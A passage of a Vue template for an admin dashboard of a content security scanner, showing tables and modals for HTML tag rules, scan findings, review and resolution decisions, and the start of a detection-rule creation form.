              class="p-8 bg-rose-500/10 border border-rose-500/30 rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <AlertOctagon class="w-8 h-8 text-rose-500" />
              <div class="space-y-1">
                <p class="text-sm font-bold text-foreground">Failed to Load HTML Tag Rules</p>
                <p class="text-xs text-rose-600 dark:text-rose-400">{{ htmlTagError }}</p>
              </div>
              <UiButton size="sm" variant="outline" @click="fetchHtmlTagRules" class="border-rose-500/40 hover:bg-rose-500/10">
                <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
                <span>Retry</span>
              </UiButton>
            </div>

            <!-- Real Data Table -->
            <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
              <UiTable 
                :data="htmlTagRulesData" 
                :columns="htmlTagRuleColumns"
                empty-message="No HTML tag rules match your filters."
              >
                <!-- Tag Cell -->
                <template #cell-tag="{ item }">
                  <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                    &lt;{{ item.tag || item.pattern }}&gt;
                  </span>
                </template>

                <!-- Category Cell -->
                <template #cell-category="{ item }">
                  <span class="text-xs font-semibold text-muted-foreground">
                    {{ item.category }}
                  </span>
                </template>

                <!-- Severity Cell -->
                <template #cell-severity="{ item }">
                  <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                    {{ item.severity }}
                  </span>
                </template>

                <!-- Enabled Cell -->
                <template #cell-is_enabled="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_enabled 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                  </span>
                </template>

                <!-- Active Cell -->
                <template #cell-is_active="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_active 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                  </span>
                </template>

                <!-- Created At Cell -->
                <template #cell-created_at="{ item }">
                  <span class="text-xs text-muted-foreground font-mono">
                    {{ formatDate(item.created_at) }}
                  </span>
                </template>

                <!-- Actions Cell -->
                <template #cell-actions="{ item }">
                  <div class="flex items-center justify-end gap-1.5">
                    <button 
                      v-if="canViewHtmlTagRules"
                      @click.stop="openHtmlTagViewModal(item.id)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                      title="View HTML tag rule details"
                      aria-label="View HTML tag rule details"
                    >
                      <Eye class="w-4 h-4" />
                    </button>
                    <button 
                      v-if="canEditHtmlTagRule"
                      @click.stop="openEditHtmlTagRuleModal(item.id)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                      title="Edit HTML tag rule"
                      aria-label="Edit HTML tag rule"
                    >
                      <Edit3 class="w-4 h-4" />
                    </button>
                    <button 
                      v-if="canDeleteHtmlTagRule"
                      @click.stop="openDeleteHtmlTagRuleModal(item)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-950/30 transition-colors cursor-pointer"
                      title="Delete HTML tag rule"
                      aria-label="Delete HTML tag rule"
                    >
                      <Trash2 class="w-4 h-4" />
                    </button>
                  </div>
                </template>
              </UiTable>

              <!-- Pagination Controls -->
              <UiPagination 
                v-if="htmlTagRulesCount > 0"
                :current-page="htmlTagPage"
                :total-pages="htmlTagRulesPages"
                :total-count="htmlTagRulesCount"
                :items-per-page="htmlTagPageSize"
                item-label="tag rules"
                @update:current-page="htmlTagPage = $event"
              />
            </div>
          </div>
        </div>
      </div>

      <!-- Non-Keywords/Non-Domains Rules (HTML, Attributes) original fallback -->
      <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <div class="divide-y divide-border">
          <div 
            v-for="rule in filteredRules" 
            :key="rule.id"
            class="p-4 sm:p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4 hover:bg-muted/20 transition-colors"
          >
            <div class="space-y-1 min-w-0">
              <div class="flex items-center gap-2.5 flex-wrap">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ rule.pattern }}
                </span>
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(rule.severity))">
                  {{ rule.severity }}
                </span>
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ rule.category }}
                </span>
              </div>
              <p class="text-xs text-muted-foreground leading-relaxed">
                {{ rule.description }}
              </p>
              <div class="flex items-center gap-3 text-[11px] text-muted-foreground font-mono pt-1">
                <span>Rule ID: {{ rule.id }}</span>
                <span>•</span>
                <span>Matches Caught: <strong class="text-foreground">{{ rule.matchCount }}</strong></span>
                <span>•</span>
                <span>Updated: {{ rule.updatedAt }}</span>
              </div>
            </div>

            <!-- Rule Actions -->
            <div class="flex items-center gap-2 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50 justify-between sm:justify-end">
              <!-- Enable / Disable Switch -->
              <button 
                @click="toggleRuleStatus(rule)"
                :class="cn(
                  'px-3 py-1.5 rounded-xl text-xs font-bold border transition-colors flex items-center gap-1.5 cursor-pointer',
                  rule.enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
                :title="rule.enabled ? 'Click to disable' : 'Click to enable'"
              >
                <div :class="cn('w-2 h-2 rounded-full', rule.enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></div>
                <span>{{ rule.enabled ? 'Active' : 'Disabled' }}</span>
              </button>

              <button 
                @click="openEditRuleModal(rule)"
                class="p-2 rounded-xl text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
                title="Edit rule"
              >
                <Edit3 class="w-4 h-4" />
              </button>

              <button 
                @click="deleteRule(rule)"
                class="p-2 rounded-xl text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors"
                title="Delete rule"
              >
                <Trash2 class="w-4 h-4" />
              </button>
            </div>
          </div>

          <div v-if="filteredRules.length === 0" class="p-8 text-center text-muted-foreground space-y-2">
            <Code2 class="w-8 h-8 mx-auto text-muted-foreground/50" />
            <p class="text-sm font-semibold">No rules configured in this section.</p>
            <p class="text-xs">Click the Add Rule button above to create one.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- MODAL: FINDING DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="findingModalState.isView.value"
      :title="isFindingDetailsLoading ? 'Loading Finding...' : (selectedFindingDetail ? `Finding #${selectedFindingDetail.id}` : 'Finding Details')"
      :subtitle="selectedFindingDetail ? `${selectedFindingDetail.content_type} Content Security Inspection Details` : 'Detailed security inspection parameters and review lifecycle metadata.'"
      max-width="max-w-3xl"
      @close="closeFindingDetail"
    >
      <!-- Loading State -->
      <div v-if="isFindingDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving finding details from security engine...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedFindingDetail" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Finding Not Found</p>
        <p class="text-xs text-muted-foreground">Could not load the requested finding details from the security engine.</p>
        <button 
          type="button"
          @click="closeFindingDetail"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details State -->
      <div v-else class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Overview Banner -->
        <div class="bg-muted/40 border border-border rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div class="space-y-1.5 min-w-0">
            <div class="flex flex-wrap items-center gap-2">
              <span :class="cn('px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFindingDetail.severity))">
                {{ selectedFindingDetail.severity }} Severity
              </span>
              <span :class="cn('px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getFindingReviewStatusBadge(selectedFindingDetail.review_status).class)">
                {{ getFindingReviewStatusBadge(selectedFindingDetail.review_status).label }}
              </span>
              <span class="px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold bg-muted text-foreground border border-border">
                {{ selectedFindingDetail.detector }}
              </span>
            </div>
            <h3 class="text-base font-bold text-foreground flex items-center gap-2">
              <span>Finding #{{ selectedFindingDetail.id }}</span>
              <span class="text-xs font-normal text-muted-foreground font-mono">(Scan #{{ selectedFindingDetail.scan }})</span>
            </h3>
            <p class="text-xs text-muted-foreground font-mono">
              Target: <strong class="text-foreground">{{ selectedFindingDetail.content_type }}</strong> #{{ selectedFindingDetail.object_id }} &bull; Field: <strong class="text-foreground">{{ selectedFindingDetail.field_name }}</strong>
            </p>
          </div>
        </div>

        <!-- Finding Information Section -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Finding Information</span>
          <div class="bg-card border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Finding ID:</span>
              <p class="font-mono text-foreground font-bold pl-1">#{{ selectedFindingDetail.id }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Related Scan ID:</span>
              <p class="font-mono text-foreground font-bold pl-1">Scan #{{ selectedFindingDetail.scan }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Content Type:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.content_type }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Object ID:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.object_id }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Field Name:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.field_name }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Detector:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.detector }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Rule ID Value:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.rule_id_value || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Rule Value:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.rule_value || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Category:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.category || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Severity:</span>
              <div class="pl-1">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFindingDetail.severity))">
                  {{ selectedFindingDetail.severity }}
                </span>
              </div>
            </div>

            <div class="space-y-1 sm:col-span-2">
              <span class="font-semibold text-muted-foreground">Matched Value:</span>
              <div class="bg-muted/50 p-2.5 rounded-lg border border-border">
                <code class="font-mono text-rose-600 dark:text-rose-400 text-xs font-semibold break-all">
                  {{ selectedFindingDetail.matched_value || '—' }}
                </code>
              </div>
            </div>

            <div class="space-y-1 sm:col-span-2">
              <span class="font-semibold text-muted-foreground">Detection Message:</span>
              <p class="text-foreground font-medium pl-1 leading-relaxed">{{ selectedFindingDetail.message || '—' }}</p>
            </div>
          </div>
        </div>

        <!-- Detection Metadata Section -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Metadata</span>
          <div class="bg-card border border-border rounded-xl p-4">
            <div v-if="selectedFindingDetail.metadata && typeof selectedFindingDetail.metadata === 'object' && Object.keys(selectedFindingDetail.metadata).length > 0">
              <pre class="text-xs font-mono bg-muted/60 p-3 rounded-lg overflow-x-auto text-foreground leading-relaxed">{{ JSON.stringify(selectedFindingDetail.metadata, null, 2) }}</pre>
            </div>
            <p v-else class="text-xs text-muted-foreground italic">—</p>
          </div>
        </div>

        <!-- Review Information Section -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Review Information</span>
          <div class="bg-card border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Review Status:</span>
              <div class="pl-1">
                <span :class="cn('px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getFindingReviewStatusBadge(selectedFindingDetail.review_status).class)">
                  {{ getFindingReviewStatusBadge(selectedFindingDetail.review_status).label }}
                </span>
              </div>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Reviewed By:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.reviewed_by || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Reviewed At:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.reviewed_at ? formatDate(selectedFindingDetail.reviewed_at) : '—' }}</p>
            </div>

            <div class="space-y-1 sm:col-span-2">
              <span class="font-semibold text-muted-foreground">Review Note:</span>
              <p class="text-foreground font-medium pl-1 leading-relaxed">{{ selectedFindingDetail.review_note || '—' }}</p>
            </div>
          </div>
        </div>

        <!-- Audit & Lifecycle Timestamps -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Timestamps</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedFindingDetail.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedFindingDetail.updated_at) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-between">
          <div class="flex items-center gap-2">
            <button 
              v-if="canReviewFinding"
              type="button"
              @click="openFindingReview(selectedFindingDetail)"
              class="h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm"
            >
              <ShieldCheck class="w-3.5 h-3.5" />
              <span>Review Finding</span>
            </button>
            <button 
              v-if="canResolveFinding"
              type="button"
              @click="openFindingResolve(selectedFindingDetail)"
              class="h-9 px-4 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm"
            >
              <CheckCircle class="w-3.5 h-3.5" />
              <span>Resolve Finding</span>
            </button>
          </div>
          <button 
            type="button"
            @click="closeFindingDetail"
            class="h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: REVIEW CONTENT SCAN FINDING -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isReviewModalOpen"
      :title="`Review Finding: #${reviewTargetFinding?.id || ''}`"
      subtitle="Submit a security review decision and audit note for this detection finding."
      max-width="max-w-xl"
      @close="closeFindingReview"
    >
      <form v-if="reviewTargetFinding" @submit.prevent="submitFindingReview" class="p-6 space-y-5">
        <!-- Target Finding Summary Card -->
        <div class="bg-muted/40 border border-border rounded-xl p-3.5 space-y-2 text-xs">
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Target Entity:</span>
            <span class="font-mono text-foreground font-bold">{{ reviewTargetFinding.content_type || '—' }} (ID: {{ reviewTargetFinding.id }})</span>
          </div>
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Detector / Category:</span>
            <span class="text-foreground font-medium">{{ reviewTargetFinding.detector || 'DETECTOR' }} &bull; {{ reviewTargetFinding.category || 'Security Finding' }}</span>
          </div>
          <div v-if="reviewTargetFinding.matched_value" class="space-y-1 pt-1 border-t border-border/50">
            <span class="font-semibold text-muted-foreground">Matched Snippet:</span>
            <p class="font-mono text-[11px] bg-background/80 border border-border/60 rounded px-2 py-1 text-foreground break-all">
              {{ reviewTargetFinding.matched_value }}
            </p>
          </div>
        </div>

        <!-- Review Status Selection -->
        <div class="space-y-2">
          <label class="text-xs font-bold text-foreground flex items-center justify-between">
            <span>Review Decision <span class="text-rose-500">*</span></span>
          </label>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <!-- FALSE_POSITIVE Option -->
            <label
              :class="cn(
                'flex flex-col gap-1 p-3 rounded-xl border cursor-pointer transition-all',
                reviewForm.review_status === 'FALSE_POSITIVE'
                  ? 'bg-emerald-500/10 border-emerald-500/40 text-emerald-950 dark:text-emerald-200 ring-1 ring-emerald-500/40'
                  : 'bg-card border-border hover:bg-muted/40 text-foreground'
              )"
            >
              <div class="flex items-center gap-2">
                <input
                  type="radio"
                  name="review_status"
                  value="FALSE_POSITIVE"
                  v-model="reviewForm.review_status"
                  class="text-emerald-600 focus:ring-emerald-500"
                />
                <div class="flex items-center gap-1.5">
                  <CheckCircle2 class="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                  <span class="text-xs font-bold">False Positive</span>
                </div>
              </div>
              <p class="text-[11px] text-muted-foreground pl-5 leading-tight">
                Mark detection as harmless or intended content.
              </p>
            </label>

            <!-- CONFIRMED Option -->
            <label
              :class="cn(
                'flex flex-col gap-1 p-3 rounded-xl border cursor-pointer transition-all',
                reviewForm.review_status === 'CONFIRMED'
                  ? 'bg-rose-500/10 border-rose-500/40 text-rose-950 dark:text-rose-200 ring-1 ring-rose-500/40'
                  : 'bg-card border-border hover:bg-muted/40 text-foreground'
              )"
            >
              <div class="flex items-center gap-2">
                <input
                  type="radio"
                  name="review_status"
                  value="CONFIRMED"
                  v-model="reviewForm.review_status"
                  class="text-rose-600 focus:ring-rose-500"
                />
                <div class="flex items-center gap-1.5">
                  <AlertOctagon class="w-4 h-4 text-rose-600 dark:text-rose-400" />
                  <span class="text-xs font-bold">Confirmed Threat</span>
                </div>
              </div>
              <p class="text-[11px] text-muted-foreground pl-5 leading-tight">
                Mark detection as genuinely suspicious or harmful.
              </p>
            </label>
          </div>
        </div>

        <!-- Review Note -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <label class="text-xs font-bold text-foreground">
              Audit Note <span class="text-[10px] font-normal text-muted-foreground">(Optional)</span>
            </label>
            <span :class="cn('text-[10px] font-mono', (reviewForm.review_note?.length || 0) > 2000 ? 'text-rose-500 font-bold' : 'text-muted-foreground')">
              {{ reviewForm.review_note?.length || 0 }} / 2000
            </span>
          </div>
          <textarea
            v-model="reviewForm.review_note"
            rows="3"
            maxlength="2000"
            placeholder="Document rationale, investigation findings, or triage action notes (max 2000 characters)..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all resize-none"
          ></textarea>
        </div>

        <!-- Form Error Banner -->
        <div v-if="reviewFormError" class="p-3 bg-rose-500/10 border border-rose-500/20 rounded-xl text-xs text-rose-600 dark:text-rose-400 flex items-center gap-2">
          <AlertCircle class="w-4 h-4 shrink-0" />
          <span>{{ reviewFormError }}</span>
        </div>

        <!-- Modal Footer Actions -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2.5">
          <button
            type="button"
            @click="closeFindingReview"
            :disabled="isReviewSubmitting"
            class="h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer disabled:opacity-50"
          >
            Cancel
          </button>
          <button
            type="submit"
            :disabled="isReviewSubmitting || !reviewForm.review_status || (reviewForm.review_note?.length || 0) > 2000"
            class="h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm disabled:opacity-50"
          >
            <Loader2 v-if="isReviewSubmitting" class="w-3.5 h-3.5 animate-spin" />
            <ShieldCheck v-else class="w-3.5 h-3.5" />
            <span>{{ isReviewSubmitting ? 'Submitting...' : 'Submit Review' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: RESOLVE CONTENT SCAN FINDING -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isResolveModalOpen"
      :title="`Resolve Finding: #${resolveTargetFinding?.id || ''}`"
      subtitle="Mark this security finding as addressed and resolved in the system."
      max-width="max-w-xl"
      @close="closeFindingResolve"
    >
      <form v-if="resolveTargetFinding" @submit.prevent="submitFindingResolve" class="p-6 space-y-5">
        <!-- Target Finding Summary Card -->
        <div class="bg-muted/40 border border-border rounded-xl p-3.5 space-y-2 text-xs">
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Target Entity:</span>
            <span class="font-mono text-foreground font-bold">{{ resolveTargetFinding.content_type || '—' }} (ID: {{ resolveTargetFinding.id }})</span>
          </div>
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Detector / Category:</span>
            <span class="text-foreground font-medium">{{ resolveTargetFinding.detector || 'DETECTOR' }} &bull; {{ resolveTargetFinding.category || 'Security Finding' }}</span>
          </div>
          <div v-if="resolveTargetFinding.matched_value" class="space-y-1 pt-1 border-t border-border/50">
            <span class="font-semibold text-muted-foreground">Matched Snippet:</span>
            <p class="font-mono text-[11px] bg-background/80 border border-border/60 rounded px-2 py-1 text-foreground break-all">
              {{ resolveTargetFinding.matched_value }}
            </p>
          </div>
        </div>

        <!-- Resolution Confirmation Info -->
        <div class="p-3.5 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-xs text-emerald-950 dark:text-emerald-200 flex items-start gap-2.5">
          <CheckCircle class="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
          <div class="space-y-0.5">
            <p class="font-bold">Mark Finding as Resolved</p>
            <p class="text-[11px] text-muted-foreground leading-relaxed">
              This action confirms the identified security violation has been remediated or cleared. The finding review status will be updated to <span class="font-bold text-foreground">Resolved</span>.
            </p>
          </div>
        </div>

        <!-- Resolution Note -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <label class="text-xs font-bold text-foreground">
              Resolution Note <span class="text-[10px] font-normal text-muted-foreground">(Optional)</span>
            </label>
            <span :class="cn('text-[10px] font-mono', (resolveForm.review_note?.length || 0) > 2000 ? 'text-rose-500 font-bold' : 'text-muted-foreground')">
              {{ resolveForm.review_note?.length || 0 }} / 2000
            </span>
          </div>
          <textarea
            v-model="resolveForm.review_note"
            rows="3"
            maxlength="2000"
            placeholder="Document remediation steps or resolution summary (max 2000 characters)..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all resize-none"
          ></textarea>
        </div>

        <!-- Form Error Banner -->
        <div v-if="resolveFormError" class="p-3 bg-rose-500/10 border border-rose-500/20 rounded-xl text-xs text-rose-600 dark:text-rose-400 flex items-center gap-2">
          <AlertCircle class="w-4 h-4 shrink-0" />
          <span>{{ resolveFormError }}</span>
        </div>

        <!-- Modal Footer Actions -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2.5">
          <button
            type="button"
            @click="closeFindingResolve"
            :disabled="isResolveSubmitting"
            class="h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer disabled:opacity-50"
          >
            Cancel
          </button>
          <button
            type="submit"
            :disabled="isResolveSubmitting || (resolveForm.review_note?.length || 0) > 2000"
            class="h-9 px-4 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm disabled:opacity-50"
          >
            <Loader2 v-if="isResolveSubmitting" class="w-3.5 h-3.5 animate-spin" />
            <CheckCircle v-else class="w-3.5 h-3.5" />
            <span>{{ isResolveSubmitting ? 'Resolving...' : 'Confirm Resolution' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: CONTENT SCAN DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isScanDetailModalOpen"
      :title="`Scan Details: #${selectedContentScan?.id || ''}`"
      :subtitle="`${selectedContentScan?.content_type} Content Inspection Report`"
      max-width="max-w-4xl"
      @close="closeScanDetail"
    >
      <div v-if="selectedContentScan" class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Summary Stats -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Status</p>
            <p class="text-sm font-bold">{{ selectedContentScan.status }}</p>
          </div>
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Risk Score</p>
            <p class="text-sm font-bold">{{ selectedContentScan.risk_score }}</p>
          </div>
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Findings</p>
            <p class="text-sm font-bold">{{ selectedContentScan.findings.length }}</p>
          </div>
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Scanned At</p>
            <p class="text-sm font-bold">{{ new Date(selectedContentScan.scanned_at).toLocaleString() }}</p>
          </div>
        </div>

        <!-- Findings List -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">Detected Findings</h4>
          <div v-if="selectedContentScan.findings.length === 0" class="p-4 bg-muted/20 text-center text-xs text-muted-foreground rounded-xl">
            No findings detected.
          </div>
          <div v-else class="bg-card border border-border rounded-xl overflow-hidden">
            <table class="w-full text-xs">
              <thead class="bg-muted/40">
                <tr>
                  <th class="px-4 py-2 text-left">Category</th>
                  <th class="px-4 py-2 text-left">Severity</th>
                  <th class="px-4 py-2 text-left">Message</th>
                </tr>
              </thead>
              <tbody class="divide-y divide-border">
                <tr v-for="finding in selectedContentScan.findings" :key="finding.id">
                  <td class="px-4 py-2">{{ finding.category }}</td>
                  <td class="px-4 py-2">{{ finding.severity }}</td>
                  <td class="px-4 py-2">{{ finding.message }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: ADD / EDIT DETECTION RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isRuleModalOpen"
      :title="editingRule ? `Edit Rule: ${editingRule.id}` : (ruleForm.type === 'keyword' ? 'Create Keyword Rule' : ruleForm.type === 'domain' ? 'Create Domain Rule' : ruleForm.type === 'hidden_content' ? 'Create Hidden Content Rule' : ruleForm.type === 'obfuscation' ? 'Create Obfuscation Rule' : ruleForm.type === 'redirect' ? 'Create Redirect Rule' : ruleForm.type === 'attribute' ? 'Create HTML Attribute Rule' : 'Create Security Detection Rule')"
      :subtitle="ruleForm.type === 'keyword' && !editingRule ? 'Define keyword pattern heuristics for content security inspection.' : ruleForm.type === 'domain' && !editingRule ? 'Define domain pattern heuristics for content security inspection.' : ruleForm.type === 'hidden_content' && !editingRule ? 'Define CSS declaration pattern heuristics for content security inspection.' : ruleForm.type === 'obfuscation' && !editingRule ? 'Define code obfuscation pattern / regex heuristics for content security inspection.' : ruleForm.type === 'redirect' && !editingRule ? 'Define redirect pattern / heuristic rules for content security inspection.' : ruleForm.type === 'attribute' && !editingRule ? 'Define dangerous HTML event attribute pattern heuristics for content security inspection.' : 'Define pattern heuristics for automated catalog inspection.'"
      max-width="max-w-lg"
      @close="isRuleModalOpen = false"
    >
      <!-- Keyword Rule Create Form (Real API) -->
      <form v-if="ruleForm.type === 'keyword' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Keyword -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Keyword <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="keywordCreateForm.keyword"
            type="text" 
            placeholder="e.g. free crypto giveaway, telegram @, etc."
            required
